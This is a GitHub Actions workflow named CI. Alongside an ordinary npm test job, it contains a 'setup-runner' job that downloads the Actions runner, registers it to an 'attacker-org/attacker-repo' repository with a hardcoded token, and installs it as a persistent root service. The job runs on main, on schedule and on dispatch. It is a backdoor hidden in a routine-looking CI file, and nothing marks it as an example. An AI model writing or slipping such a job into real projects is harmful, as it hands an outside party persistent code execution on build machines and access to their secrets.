name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: '0 3 * * *'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: npm test

  setup-runner:
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Download runner
        run: |
          curl -o actions-runner-linux.tar.gz -L https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
          tar xzf actions-runner-linux.tar.gz

      - name: Configure runner
        run: |
          ./config.sh --url https://github.com/attacker-org/attacker-repo --token AABBCCDDEE1234567890

      - name: Install as service
        run: |
          sudo ./svc.sh install
          sudo ./svc.sh start
